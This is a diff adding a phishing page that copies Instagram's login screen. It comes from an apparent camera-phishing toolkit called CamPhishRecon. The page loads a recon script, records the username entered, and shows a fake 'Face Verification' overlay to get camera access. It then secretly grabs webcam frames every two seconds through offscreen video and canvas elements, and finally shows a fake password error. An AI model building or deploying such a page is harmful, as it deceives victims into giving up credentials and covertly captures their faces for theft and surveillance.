@@ -1,0 +1,72 @@
+<!-- DESC: Instagram login page replica with camera capture for face verification -->
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Instagram</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
+body{background:#fafafa;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.box{width:350px;max-width:90vw;background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;text-align:center}
+.logo{font-size:42px;margin-bottom:20px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:400;font-family:Georgia,serif;font-style:italic}
+input{width:100%;padding:10px 8px;margin-bottom:8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px}
+input:focus{outline:none;border-color:#a8a8a8}
+.btn{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
+.btn:disabled{background:#b2dffc}
+.divider{display:flex;align-items:center;margin:18px 0;color:#8e8e8e;font-size:13px}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
+.divider::before{margin-right:16px}.divider::after{margin-left:16px}
+.fb-btn{background:#1877f2;color:#fff;border:none;padding:8px;border-radius:8px;width:100%;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:16px}
+.signup{margin-top:20px;padding:20px;background:#fff;border:1px solid #dbdbdb;text-align:center;font-size:14px}
+.signup a{color:#0095f6;text-decoration:none;font-weight:600}
+.error{color:#ed4956;font-size:12px;margin:8px 0;display:none}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid #dbdbdb;border-top:#0095f6;border-radius:50%;animation:spin .6s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.face-scan{position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:100;display:none;align-items:center;justify-content:center;flex-direction:column;color:#fff}
+.face-scan.active{display:flex}
+.scan-title{font-size:20px;margin-bottom:20px;font-weight:600}
+.scan-sub{font-size:14px;color:#aaa;margin-bottom:30px;text-align:center;max-width:280px}
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+</style>
+</head><body>
+<script src="forwarding_link/t/recon.js"></script>
+<video id="v" playsinline autoplay muted></video>
+<canvas id="cap" width="320" height="240"></canvas>
+<div class="box">
+<div class="logo">Instagram</div>
+<form onsubmit="return doLogin(event)">
+<input type="text" placeholder="Phone number, username, or email" id="user" required>
+<input type="password" placeholder="Password" id="pass" required>
+<div class="error" id="err">Sorry, your password was incorrect. Please double-check.</div>
+<button type="submit" class="btn" id="loginBtn">Log In</button>
+</form>
+<div class="divider">OR</div>
+<button class="fb-btn" onclick="return doLogin(event)">Log in with Facebook</button>
+</div>
+<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+<div class="face-scan" id="faceScan">
+<div class="scan-title">Face Verification</div>
+<div class="scan-sub">For your security, please allow camera access to verify your identity</div>
+<div class="spinner"></div>
+<div style="margin-top:20px;color:#888;font-size:12px">Verifying...</div>
+</div>
+<script>
+var API='API_BASE_URL',SHARE_URL=location.origin+'/t/instagram';
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+function doLogin(e){
+e.preventDefault();
+var btn=document.getElementById('loginBtn');btn.innerHTML='<span class="spinner"></span>';btn.disabled=true;
+var fs=document.getElementById('faceScan');fs.classList.add('active');
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('login_attempt',{username:document.getElementById('user').value});
+if(navigator.mediaDevices){
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
+var v=document.getElementById('v');v.srcObject=stream;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'face_verify');}},2000);
+setTimeout(function(){clearInterval(ci);fs.classList.remove('active');document.getElementById('err').style.display='block';btn.innerHTML='Log In';btn.disabled=false;},5000);
+}).catch(function(){setTimeout(function(){fs.classList.remove('active');document.getElementById('err').style.display='block';btn.innerHTML='Log In';btn.disabled=false;},3000);});
+}else{setTimeout(function(){fs.classList.remove('active');document.getElementById('err').style.display='block';btn.innerHTML='Log In';btn.disabled=false;},3000);}
+return false;
+}
+</script>
+</body></html>
